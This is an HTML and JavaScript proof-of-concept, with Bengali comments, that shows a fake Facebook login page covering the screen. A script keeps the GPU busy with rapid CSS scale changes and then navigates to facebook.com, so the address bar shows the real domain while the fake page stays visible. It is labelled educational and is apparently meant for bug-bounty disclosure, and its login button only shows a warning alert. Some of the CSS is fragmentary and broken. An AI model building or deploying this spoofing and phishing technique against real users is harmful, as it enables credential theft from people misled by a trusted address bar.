        :root {

        /* ============================================ */
        .fake-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            z-index: 99999;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        .fake-login-card {
            background: white;

        .fake-login-card .logo {

            color: white;

            border-radius: 6px;

            cursor: pointer;
        }

        .fake-login-card button:active {
            background: #166fe5;
        }

            margin-top: 16px;

<body>

    <!-- GPU কিলার এলিমেন্ট (আপনার দেওয়া POC অনুযায়ী) -->
    <dl>KeCK~h</dl>

    <!-- ফেক ফেসবুক লগইন পেজ -->
    <div class="fake-container" id="fakeUI">
        <div class="fake-login-card">
            <div class="logo">📘</div>
            <h1>Facebook</h1>
            <input type="text" placeholder="Email or phone number" value="attacker@fake.com">
            <input type="password" placeholder="Password" value="********">
            <button id="fakeLoginBtn">Log In</button>
            <div class="forgot">Forgotten password?</div>
        </div>
    </div>

    <div class="edu-badge">🔐 EDUCATIONAL POC ONLY | Address bar will spoof to https://facebook.com</div>

    <script>
        (function() {
            // ==============================================
            // কনফিগারেশন
            // ==============================================
            const SPOOF_URL = "https://facebook.com";     // অ্যাড্রেস বার এ যা দেখাবে
            const REDIRECT_DELAY = 2500;                  // ২.৫ সেকেন্ড পর URL বদলাবে
            const SCALE_INTERVAL = 10;                    // প্রতি ১০ms এ স্কেল চেঞ্জ হবে (GPU busy রাখার জন্য)

            let root = document.documentElement;
            let intervalId = null;

            // ==============================================
            // GPU ব্যস্ত রাখার ফাংশন (আপনার POC এর মত)
            // ==============================================
            function startGPUKiller() {
                if (intervalId) clearInterval(intervalId);
                
                intervalId = setInterval(function() {
                    let randomScale = Math.random() * 12;
                    root.style.setProperty('--scale-int', randomScale);
                }, SCALE_INTERVAL);
            }

            // ==============================================
            // URL স্পুফিং ট্রিগার
            // ==============================================
            function triggerSpoof() {
                if (intervalId) {
                    clearInterval(intervalId);
                    intervalId = null;
                }
                
                console.log('[!] Spoofing: Navigating to', SPOOF_URL);
                console.log('[!] BUT the Fake Facebook login page will remain visible!');
                
                // এড্রেস বার পরিবর্তন করুন
                window.location.href = SPOOF_URL;
                
                // নোট: location.href পরিবর্তনের পর পেজ আনলোড হবে,
                // কিন্তু GPU ব্যস্ত থাকায় পুরনো পেজের UI কিছুক্ষণ দেখাবে
            }

            // ==============================================
            // ক্লিকজ্যাকিং ডেমো (শিক্ষামূলক)
            // ==============================================
            function setupClickjackingAlert() {
                const fakeBtn = document.getElementById('fakeLoginBtn');
                if (fakeBtn) {
                    fakeBtn.addEventListener('click', function(e) {
                        e.preventDefault();
                        console.log('[!] Fake Login Button Clicked!');
                        
                        alert('⚠️ CLICKJACKING DEMO ⚠️\n\n' +
                              'If this was a real attack, clicking this button would have:\n\n' +
                              '1️⃣ Submitted your credentials to the attacker, OR\n' +
                              '2️⃣ Clicked on a hidden button on the REAL website below!\n\n' +
                              '✅ Address bar shows facebook.com but page is FAKE!\n' +
                              '✅ This is Address Bar Spoofing + Clickjacking\n\n' +
                              '📢 Report responsibly to bug bounty programs.');
                    });
                }
            }

            // ==============================================
            // পেজ লোড হলে শুরু করুন
            // ==============================================
            window.addEventListener('load', function() {
                console.log('[+] POC Loaded - Fake Facebook Login Page');
                console.log('[+] GPU Killer Started - Rendering will be slow');
                
                startGPUKiller();
                setupClickjackingAlert();
                
                console.log(`[+] Will spoof address bar to ${SPOOF_URL} in ${REDIRECT_DELAY/1000} seconds...`);
                setTimeout(triggerSpoof, REDIRECT_DELAY);
            });

        })();
    </script>
</body>
</html>
